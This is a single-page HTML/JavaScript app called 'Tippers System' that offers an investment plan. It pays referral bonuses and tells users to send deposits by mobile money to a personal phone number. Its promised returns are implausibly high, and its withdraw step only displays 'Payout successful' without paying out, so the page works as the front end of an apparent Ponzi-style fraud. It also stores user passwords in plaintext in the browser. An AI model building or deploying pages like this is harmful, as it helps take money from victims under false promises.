<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers System</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{margin:0;font-family:Segoe UI;background:#0b1120;display:flex;justify-content:center;align-items:center;height:100vh}
.app{width:390px;height:95vh;background:#000;border-radius:20px;display:flex;flex-direction:column;color:white;overflow:hidden}
.content{flex:1;padding:15px;overflow-y:auto}
.title{text-align:center;color:#f59e0b}
input,select{width:100%;padding:10px;margin-top:8px;border:none;border-radius:8px;background:#0f172a;color:white}
button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px;background:#f59e0b;color:black;font-weight:bold}
.row{display:flex;gap:5px}
.nav{display:flex;justify-content:space-around;background:#111;padding:10px}
.nav div{font-size:12px;cursor:pointer}
.locked{opacity:.3;pointer-events:none}
.table{overflow-x:auto;white-space:nowrap}
.cell{display:inline-block;min-width:140px;background:#111;margin:5px;padding:8px;border-radius:8px;font-size:12px}
.toast{position:fixed;bottom:20px;background:red;color:white;padding:10px;border-radius:8px;display:none}
</style>
</head>

<body>

<div class="app">
<div class="content" id="screen"></div>

<div class="nav" id="nav" style="display:none">
<div id="homeBtn" onclick="home()" class="locked">HOME</div>
<div id="depBtn" onclick="deposit()" class="locked">DEPOSIT</div>
<div id="earnBtn" onclick="earn()" class="locked">EARN</div>
<div id="witBtn" onclick="withdraw()" class="locked">WITHDRAW</div>
</div>
</div>

<div class="toast" id="toast"></div>

<script>

let users = JSON.parse(localStorage.getItem("users")) || [];
let currentUser = null;
let depositDone = false;
let amount = 0;
let refId = new URLSearchParams(location.search).get("ref");

const screen = document.getElementById("screen");

function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2000);
}

/* WELCOME */
function start(){
screen.innerHTML=`
<h2 class="title">WELCOME</h2>
<button onclick="register()">NEXT</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`
<h3 class="title">REGISTER</h3>

<input id="fn" placeholder="First name">
<input id="ln" placeholder="Last name">

<select id="code">
<option>+250</option>
<option>+254</option>
</select>

<input id="phone" placeholder="Phone">
<input id="email" placeholder="Email">
<input id="pass" placeholder="Password">
<input id="cpass" placeholder="Confirm password">

<button onclick="doRegister()">REGISTER</button>
`;
}

/* FIXED REGISTER */
function doRegister(){

let fn=document.getElementById("fn").value;
let ln=document.getElementById("ln").value;
let phone=document.getElementById("phone").value;
let email=document.getElementById("email").value;
let pass=document.getElementById("pass").value;
let cpass=document.getElementById("cpass").value;

if(!fn||!ln||!phone||!email||!pass||!cpass){
toast("Fill all fields"); return;
}

if(pass!==cpass){
toast("Password mismatch"); return;
}

let id = Date.now();

let user = {
id,
fn,ln,phone,email,pass,
refLink: location.origin + "?ref=" + id,
refBy: refId || null,
balance:0
};

users.push(user);
localStorage.setItem("users",JSON.stringify(users));

toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
screen.innerHTML=`
<h3 class="title">LOGIN</h3>

<input id="le" placeholder="Email">
<input id="lp" placeholder="Password">

<button onclick="doLogin()">LOGIN</button>
`;
}

function doLogin(){
let le=document.getElementById("le").value;
let lp=document.getElementById("lp").value;

let u = users.find(x=>x.email==le && x.pass==lp);
if(!u){toast("Invalid login");return;}

currentUser=u;
document.getElementById("nav").style.display="flex";
unlockHome();
home();
}

/* HOME TABLE */
function home(){
screen.innerHTML=`
<h3 class="title">TIPPERS INVESTMENT PLAN</h3>

<div class="table">
<div class="cell">INVEST</div>
<div class="cell">1 DAY</div>
<div class="cell">1 WEEK</div>
<div class="cell">1 MONTH</div>
<div class="cell">45 DAYS</div>
<div class="cell">3 MONTH</div>
<div class="cell">4 MONTH</div>

<div class="cell">5,000</div>
<div class="cell">110</div>
<div class="cell">1,050</div>
<div class="cell">5,400</div>
<div class="cell">9,225</div>
<div class="cell">22,500</div>
<div class="cell">42,000</div>
</div>

<button onclick="goDeposit()">NEXT</button>

<p>Your referral link:</p>
<small>${currentUser.refLink}</small>
`;
}

/* DEPOSIT */
function goDeposit(){
unlockAll();
screen.innerHTML=`
<h3 class="title">DEPOSIT</h3>

<input id="amt" placeholder="Enter amount">
<input id="sender" placeholder="Sender name">

<button onclick="pay()">CONTINUE</button>
`;
}

function pay(){
let amt=document.getElementById("amt").value;
let sender=document.getElementById("sender").value;

if(!amt||!sender){toast("Fill all");return;}

amount=parseInt(amt);

screen.innerHTML=`
<h3 class="title">PAY</h3>
<p>0792459701</p>
<p>*182*1*1*0792459701#</p>

<button onclick="finishDeposit()">FINISH</button>
`;
}

function finishDeposit(){
depositDone=true;

/* REF BONUS 6% */
if(refId){
let refUser = users.find(u=>u.id==refId);
if(refUser){
refUser.balance += amount * 0.06;
}
}

localStorage.setItem("users",JSON.stringify(users));

toast("Deposit success + referral bonus");
home();
}

/* WITHDRAW */
function withdraw(){
if(!depositDone){toast("Locked");return;}

screen.innerHTML=`
<h3 class="title">WITHDRAW</h3>

<input id="wamt" placeholder="Amount">
<input id="wphone" placeholder="Your phone">

<button onclick="doWithdraw()">PAYOUT</button>
`;
}

function doWithdraw(){
let p=document.getElementById("wphone").value;

if(p!==currentUser.phone){
toast("Phone not found");return;
}

toast("Payout successful ✔");
}

/* UNLOCK */
function unlockHome(){
document.getElementById("homeBtn").classList.remove("locked");
}

function unlockAll(){
document.querySelectorAll(".nav div").forEach(d=>d.classList.remove("locked"));
}

start();

</script>

</body>
</html>
